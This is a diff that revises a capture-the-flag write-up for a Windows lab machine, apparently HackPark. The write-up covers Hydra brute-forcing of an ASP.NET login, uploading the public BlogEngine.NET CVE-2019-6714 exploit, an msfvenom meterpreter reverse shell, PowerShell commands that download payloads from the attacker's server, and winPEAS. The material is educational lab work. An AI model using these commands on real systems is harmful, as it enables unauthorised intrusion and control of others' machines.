@@ -2,7 +2,7 @@
 
 Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
 
-New target start of with a NMAP scan, this one drops ICMP so use no ping (Pn) and standard scripts with service information.
+### New target start of with a NMAP scan, this one drops ICMP so use no ping (Pn) and standard scripts with service information.
 
 ```
 ~# sudo nmap -Pn -sC -sV <targetIP>
@@ -32,7 +32,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 91.88 seconds
 ```
-quick gobuster check
+### Quick gobuster check:
 Note: wordlist /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt showed the output below but was not overly interesting. The following gave more significant results but most of no obvious interest: 
 /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt.
 
@@ -90,9 +90,7 @@ You can check what request a form is making by right clicking on the login form,
 
 Answer: POST, from quick source code check on login page.
 ```
-...
  <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
-...
 ```
 
 ## Q2 Guess a username, choose a password wordlist and gain credentials to a user account!
@@ -104,7 +102,7 @@ hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
 - Where the module "http-post-form" is best suited to meet our needs.
 - However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more.
 
-Below is a mini cheatsheet:
+### Below is a mini cheatsheet:
 
 Command	Description
 - hydra -P <wordlist> -v <ip> <protocol>
@@ -115,11 +113,15 @@ Command	Description
 - hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
   	Attack a Windows Remote Desktop with a password list.
 - hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
-  	Craft a more specific request for Hydra to brute force.
+
+### Craft a more specific request for Hydra to brute force.
 
 One of easiest ways to find the necessary information is from the use of browser content inspector, under network tabs there we can view the transaction of requests and response from the login of an incorrect password. The alternative was burpe suite which given we know the use name is admin, sending login page to intruder with sniper attack its possible to obtain the password, likely easier. 
 
-This particular example aspx login page is an situation where the server does not evaluate the two paramters __VIEWSTATE and __EVENTVALIDATION, but expects a value which I discovered works for fresh from today, yesterday or from undisclosed time from one I found online. If this were evaluated this would require a fresh pair for each time the login attempt occured.
+This particular example aspx login page is an situation where the server does not evaluate the two paramters: 
+- __VIEWSTATE and 
+- __EVENTVALIDATION 
+In this example expects values which I discovered works for fresh from today, yesterday or from undisclosed time from one I found online. If this were evaluated this would require a fresh pair for each time the login attempt occured.
 
 So if the ASPX login truly enforces VIEWSTATE and EVENTVALIDATION, then Hydra becomes effectively unusable, and Burp Suite becomes the correct tool.
 
@@ -127,7 +129,7 @@ The reason is simple:
 - Hydra cannot fetch fresh tokens for every attempt.
 - Burp Intruder can reuse or regenerate them depending on how the page behaves.
 
-What are VIEWSTATE and EVENTVALIDATION: 
+### What are VIEWSTATE and EVENTVALIDATION: 
 - ASP.NET WebForms requires __VIEWSTATE and __EVENTVALIDATION because the framework was designed in the early 2000s to simulate a stateful desktop‑application model on top of the stateless HTTP protocol. These two hidden fields are how the server keeps track of what the page looked like, what controls existed, and what events are allowed when the user submits a form.
 When you brute‑force a WebForms login, the server expects:
 - the exact __VIEWSTATE for that page load
@@ -138,7 +140,7 @@ When you brute‑force a WebForms login, the server expects:
 	-  Hydra sees no “Login failed”.
 	-  the attack fails silently.
 
-Other field sent in the request for login:
+### Other field sent in the request for login:
 In this example :
 - /Account/login.aspx → form action
 - ctl00$MainContent$LoginUser$UserName=^USER^ → username placeholder
@@ -243,9 +245,9 @@ minPassLengthInChars: "Minimum password length is {0} characters"
 ```
 
 
-##Building the Hydra module
+## Building the Hydra module
 
-Hydra syntax for web forms:
+### Hydra syntax for web forms:
 ```
 hydra -l USER -P passlist.txt <IP> http-post-form "<path>:<params>:<failure string>" -f
 ```
@@ -256,7 +258,7 @@ hydra -l admin -P passwords.txt <TARGET_IP> -V http-post-form \
 ```
 The browser converts from this to percentage encoded on transit, we need to change required sections for percentage encoding.
 
-- Note that burpe suite these two parameters EVENTVALIDATION and VIEWSTATE are in the correct format and can be save time on changingn them to percentage encoding.
+- Note that burpe suite these two parameters EVENTVALIDATION and VIEWSTATE are in the correct format and can be save time on changing them to percentage encoding.
 
 Percentage encoding required here so we need to change:
 $ → %24
@@ -284,26 +286,32 @@ Answer: 1qaz2wsx
 # Task 3 Compromise the Machine
 
 Next using exploit-db and version of the BlogEngine we will exploit to gain initial windows access.
+
 ## Q1 After logging in obtain the verion for BlogEngine used:
+
 Answer: 3.3.6.0 This is obtained from hamburger menu -> about -> here you obtain informatoin about BlogEngine.NET 
 
 ## Q2 Use the exploit database archive (http://www.exploit-db.com/) to find an exploit to gain a reverse shell on this system.
 What is the CVE?
+
 Visiting exploint-db.com: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution is shown. 
+
 Answer: CVE: 2019-6714
 
-Exploit:    Available and listed on page but very long see the website above to see it.
-Platform: ASPX
-Date: 2019-02-12
+### Using exploit to gain initial access to the server:
 
-- Next make a copy of exploit on page save with name and extension exactly as PostView.ascx.
+The exploit is available on the website above by simple "blogengine" search. Here is the process to use it:
+
+- Make a copy of exploit on page save with name and extension exactly as PostView.ascx.
 - Open a netcat listener
-- Change IP and port call back changed to connect to out listener and VPN tun0 IP.
+- Change IP and port in exploit to link with netcat listener. 
 - After login with admin account details,
 	- Select the hamburger on top left.
  	- Select 'Content'
   	- Select 'Posts' (should only be one 'Welcome to HackPark')
-  	- This should allow editing of the Welcome page, select the folder which represents file manager on the right side. Here we upload the PostView.ascx exploit we just copied from the exploit-db.com website. This should appear next to Welcome page image.
+  	- This should allow editing of the Welcome page, select the folder which represents file manager on the right side. Here we upload the PostView.ascx exploit we just copied from the exploit-db.com website. This should appear next to Welcome page image. Then trigger the exploit as stated in the notation section of the exploit through changing url bar themes location.
+  	- url bar should look like http://<targetIP>/?theme=../../App_Data/files
+  	- BlogEngine looks inside that folder for the theme’s .ascx files, including PostView.ascx, and compiles and executes it as server‑side code, which links to netcat listener setup.
 
 From the exploit itself basic instruction:
 ```
@@ -343,9 +351,9 @@ c:\whoami
 ```
 Answer:iis apppool\blog 
 
-# Task 4
+# Task 4 Windows Privilege Escalation
 
-Here a more stable reverse shell is the goal that from the exploit so a msfvenom payload is required for a windows system:
+Here a more stable reverse shell is the goal that from the exploit so a msfvenom meterpreter payload is required for a windows system:
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f exe > shell.exe
 ```
@@ -356,7 +364,7 @@ Then upload the exploit to the target and check it arrived:
 c:\windows\system32\inetsrv>
 cd c:\windows\temp
 c:\Windows\Temp>
-powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:8000/shell.exe' -Outfile 'c:\windows\temp\shell.exe'
+powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\windows\temp\shell.exe'
 dir shell.*
 c:\Windows\Temp>dir shell.*
  Volume in drive C has no label.
@@ -366,7 +374,7 @@ c:\Windows\Temp>dir shell.*
                1 File(s)         73,802 bytes
                0 Dir(s)  38,981,611,520 bytes free
 ```
-Start metasploit console and prepare a listener for the exploit (must be windows/meterpreter/reverse_tcp)
+Start metasploit console and prepare a listener for the exploit (must be windows/meterpreter/reverse_tcp same as msfvenom payload):
 ```
 msf6 > use exploit multihandler
 [-] No results from search
@@ -376,16 +384,13 @@ msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > show options 
 Payload options (generic/shell_reverse_tcp):
 
-   Name   Current   Required  Descriptio
-          Setting             n
+   Name   Current   Required  Description
+          Setting             
    ----   --------  --------  ----------
-   LHOST            yes       The listen
-                               address (
-                              an interfa
-                              ce may be
-                              specified)
-   LPORT  4444      yes       The listen
-                               port
+   LHOST            yes       The listen address 
+                              (an interface may 
+                              be specified)
+   LPORT  4444      yes       The listen port
 
 Exploit target:
 
@@ -395,19 +400,19 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 
-msf6 exploit(multi/handler) > set LHOST 10.145.67.108
-LHOST => 10.145.67.108
+msf6 exploit(multi/handler) > set LHOST <AttackBoxIP>
+LHOST => <AttackBoxIP>
 msf6 exploit(multi/handler) > set LPORT 4444
 LPORT => 4444
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > run
-[*] Started reverse TCP handler on 10.145.67.108:4444 
+[*] Started reverse TCP handler on <AttackBoxIP>:4444 
 ```
 Next upload winPEAS to target similarly start a python3 server in directory with the exploit.
 Note even if other simple server is closed will need to be a different port, as error thrown with no upload.
 ```
-root@ip-10-145-67-108:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server
+root@ip-<AttackBoxIP>:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:6000/) ...
 ```
 then use a simple powershell command to upload winPEAS to target:
@@ -416,9 +421,9 @@ powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:6000/winPEAS.bat' -O
 ```
 File transferred successfully after changing port 8000 to 6000 even though previous server was closed.
 ```
-root@ip-10-145-67-108:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 6000
+root@ip-<AttackBoxIP>:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 6000
 Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:6000/) ...
-10.145.143.177 - - [19/Apr/2026 21:11:30] code 404, message File not found
-10.145.143.177 - - [19/Apr/2026 21:11:30] "GET /shell.exe HTTP/1.1" 404 -
-10.145.143.177 - - [19/Apr/2026 21:13:24] "GET /winPEAS.bat HTTP/1.1" 200 -
+<targetIP> - - [19/Apr/2026 21:11:30] code 404, message File not found
+<targetIP> - - [19/Apr/2026 21:11:30] "GET /shell.exe HTTP/1.1" 404 -
+<targetIP> - - [19/Apr/2026 21:13:24] "GET /winPEAS.bat HTTP/1.1" 200 -
 ```
